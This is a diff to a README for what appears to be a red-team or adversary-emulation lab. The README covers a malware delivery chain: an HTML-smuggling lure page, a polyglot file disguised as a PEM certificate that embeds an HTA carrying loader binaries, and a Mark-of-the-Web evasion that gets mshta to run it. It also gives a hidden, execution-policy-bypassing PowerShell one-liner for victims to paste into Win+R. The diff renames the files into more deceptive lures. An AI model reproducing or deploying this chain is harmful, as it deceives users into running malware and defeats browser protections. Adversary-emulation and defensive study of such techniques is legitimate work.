@@ -15,7 +15,7 @@ where `ADODB.Stream.SaveToFile` is blocked ("Safety settings ... prohibit access
 data source on another domain"). This variant avoids that by never letting the browser
 create the HTA:
 
-- the browser only saves `Essos_Compliance_Update.txt` (inert);
+- the browser only saves `Essos_Compliance_Update.cer` (inert);
 - the user runs a `powershell.exe` one-liner (Win+R), and **PowerShell creates the HTA**
   -> the new file has no `Zone.Identifier` -> `mshta` runs it in the Local Machine zone
   -> `ADODB.Stream` works.
@@ -29,7 +29,7 @@ create the HTA:
 [browser opens http://192.168.56.2:8080/staging.html]
         |
         v
-[page reconstructs Essos_Compliance_Update.txt from an embedded base64 blob]
+[page reconstructs Essos_Compliance_Update.cer from an embedded base64 blob]
    - no HTTP GET for the .txt (T1027.006 HTML Smuggling)
         |
         v
@@ -52,11 +52,11 @@ create the HTA:
 
 | File | Role |
 |------|------|
-| `stage1.tpl.hta` | HTA **template** (`@@EXE_B64@@` / `@@DLL_B64@@` placeholders) |
+| `hpsolutionsportal.tpl.hta` | HTA **template** (`@@EXE_B64@@` / `@@DLL_B64@@` placeholders) |
 | `staging.tpl.html` | Smuggling page **template** (`@@TXT_B64@@` placeholder) |
 | `build.py` | Generates the runtime files below |
-| `stage1.hta` | Generated HTA (embeds `EssosUpdate.exe` + `wsdapi.dll`) — committed |
-| `Essos_Compliance_Update.txt` | Generated polyglot PEM/PowerShell (embeds `stage1.hta`) — committed |
+| `hpsolutionsportal.hta` | Generated HTA (embeds `EssosUpdate.exe` + `wsdapi.dll`) — committed |
+| `Essos_Compliance_Update.cer` | Generated polyglot PEM/PowerShell (embeds `hpsolutionsportal.hta`) — committed |
 | `staging.html` | Generated lure page (embeds the `.txt`) — committed, served by the operator |
 | `make_iso.ps1` | **Unused** — kept from an abandoned ISO-packaging experiment |
 
@@ -75,14 +75,14 @@ Reads the loader from the ToneShell tree:
 
 Outputs:
 
-- `stage1.hta` (~410 KB) — HTA with both loader binaries base64-embedded in hidden `<textarea>` elements
-- `Essos_Compliance_Update.txt` (~556 KB) — polyglot PEM/PowerShell: base64 of `stage1.hta` inside a `<# ... #>` block comment (looks like a PEM certificate bundle) plus a PowerShell decoder line that reads the file back, base64-decodes it, renames `.bin` -> `.hta`, and runs `mshta.exe`
+- `hpsolutionsportal.hta` (~410 KB) — HTA with both loader binaries base64-embedded in hidden `<textarea>` elements
+- `Essos_Compliance_Update.cer` (~556 KB) — polyglot PEM/PowerShell: base64 of `hpsolutionsportal.hta` inside a `<# ... #>` block comment (looks like a PEM certificate bundle) plus a PowerShell decoder line that reads the file back, base64-decodes it, renames `.bin` -> `.hta`, and runs `mshta.exe`
 - `staging.html` (~753 KB) — page with the `.txt` base64-embedded in `var b64 = '...'`
 
 The Win+R command (also printed by `build.py`):
 
 ```
-powershell -w h -ep bypass -c "iex(gc -Raw '%USERPROFILE%\Downloads\Essos_Compliance_Update.txt')"
+powershell -w h -ep bypass -c "iex(gc -Raw '%USERPROFILE%\Downloads\Essos_Compliance_Update.cer')"
 ```
 
 ## Server requirements
@@ -93,7 +93,7 @@ Only `staging.html` is served, from the shared staging web server:
 http://192.168.56.2:8080/staging.html
 ```
 
-`Essos_Compliance_Update.txt` and `Essos_Compliance_Update.hta` are **not** hosted — they are reconstructed/created on the victim.
+`Essos_Compliance_Update.cer` and `Essos_Compliance_Update.hta` are **not** hosted — they are reconstructed/created on the victim.
 
 ## Runtime notes
 
@@ -104,4 +104,4 @@ http://192.168.56.2:8080/staging.html
 
 ## Rebuild
 
-After changing `stage1.tpl.hta` or `staging.tpl.html`, re-run `build.py` and re-serve `staging.html`.
+After changing `hpsolutionsportal.tpl.hta` or `staging.tpl.html`, re-run `build.py` and re-serve `staging.html`.
